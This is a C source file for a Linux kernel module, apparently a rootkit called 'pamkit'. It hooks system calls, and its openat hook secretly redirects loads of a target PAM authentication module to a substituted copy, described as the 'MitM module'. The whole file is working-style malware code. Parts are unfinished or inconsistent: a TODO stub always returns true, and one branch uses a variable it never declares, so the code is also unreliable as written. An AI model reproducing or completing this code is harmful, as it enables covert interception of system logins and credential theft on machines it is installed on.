#include "config.h"
#include "syscalls.h"

#pragma GCC optimize("-fno-optimize-sibling-calls")

// TODO: move (and refactor) the logic from 'sys.c' into this file

static void *
get_data_from_user(void __user *data, size_t max_size)
{
    void *kbuffer = kzalloc(max_size, GFP_KERNEL);
    if (!kbuffer) {
        prerr_ratelimited("Allocating buffer to copy user data failed");
        return NULL;
    }

    if (copy_from_user(kbuffer, data, max_size)) {
        prerr_ratelimited("Failed to copy data from user- into kernelspace");
        kfree(kbuffer);
        return NULL;
    }

    return kbuffer;
}

static inline bool
is_pamkit_target_module_copy(int dfd, char *path)
{
    // TODO
    return true;
}

SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
{
    long ret = SYSCALL_ORIG_READ(pt_regs, fd, buf, count);
    return ret;
}

SYSCALL_HOOK(open, const char __user *filename, int flags, umode_t mode)
{
    long ret = SYSCALL_ORIG_OPEN(pt_regs, filename, flags, mode);
    return ret;
}

SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mode)
{
    long ret;

    #ifdef PAMKIT_PTREGS_STUBS
    int arg_dfd = FIRST_ARG(pt_regs, int);
    char *arg_filename = (char *) get_data_from_user(SECOND_ARG(pt_regs, char *), NAME_MAX * sizeof(char));
    #else
    int dfd_arg = dfd;
    char *arg_filename = (char *) get_data_from_user(filename, NAME_MAX * sizeof(char));
    #endif

    if (!arg_filename) {
        prerr_ratelimited("Unable to copy user provided filename into kernelspace");
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    if (!strstr(arg_filename, TARGET_PAM_MODULE_NAME)) {
        goto skip_pam_module_replacement;
    }

    /* Do not intercept the module copy used by the MitM module */
    if (is_pamkit_target_module_copy(arg_dfd, arg_filename)) {
        kfree(arg_filename);
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    void __user *userspace_replacement_module_path = (void *) vm_mmap(
        NULL,
        0,
        strlen(TARGET_MODULE_COPY_PATH) + 1,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        0
    );

    if (IS_ERR_OR_NULL(userspace_replacement_module_path)) {
        prerr_ratelimited("Failed to allocate userspace buffer holding path of the target module's copy");
        kfree(arg_filename);
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    if (copy_to_user(
        userspace_replacement_module_path,
        TARGET_MODULE_COPY_PATH,
        strlen(TARGET_MODULE_COPY_PATH) + 1
        )
    ) {
        prerr_ratelimited("Failed to write path of target module copy into userspace allocated buffer");
        kfree(arg_filename);
        vm_munmap((uintptr_t) userspace_replacement_module_path, strlen(TARGET_MODULE_COPY_PATH) + 1);
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    #ifdef PAMKIT_PTREGS_STUBS

    struct pt_regs *modifiable_pt_regs = (struct pt_regs *) pt_regs;
    modifiable_pt_regs->si = (unsigned long) userspace_replacement_module_path;

    #else

    char __user **modifiable_filename = (char __user **) &filename;
    *modifiable_filename = (char __user *) userspace_replacement_module_path;

    #endif

    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    kfree(arg_filename);
    vm_munmap((uintptr_t) userspace_replacement_module_path, strlen(TARGET_MODULE_COPY_PATH) + 1);

    prdebug_ratelimited("Replaced target pam module");
    return ret;

skip_pam_module_replacement:

    kfree(arg_filename);
    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    return ret;
}

SYSCALL_HOOK(newfstatat, int dfd, const char __user *filename, struct stat __user *statbuf, int flag)
{
    long ret = SYSCALL_ORIG_NEWFSTATAT(pt_regs, dfd, filename, statbuf, flag);
    return ret;
}

SYSCALL_HOOK(close, int fd)
{
    long ret = SYSCALL_ORIG_CLOSE(pt_regs, fd);
    return ret;
}

SYSCALL_HOOK(mmap, unsigned long addr, unsigned long len, int prot, int flags, int fd, long off)
{
    long ret = SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
    return ret;
}

hook_data_t pamkit_syscall_hooks[] = {
    GEN_SYSCALL_HOOK_DATA(read),
    GEN_SYSCALL_HOOK_DATA(open),
    GEN_SYSCALL_HOOK_DATA(openat),
    GEN_SYSCALL_HOOK_DATA(newfstatat),
    GEN_SYSCALL_HOOK_DATA(close),
    GEN_SYSCALL_HOOK_DATA(mmap),
    SYSCALL_HOOK_DATA_EMPTY
};
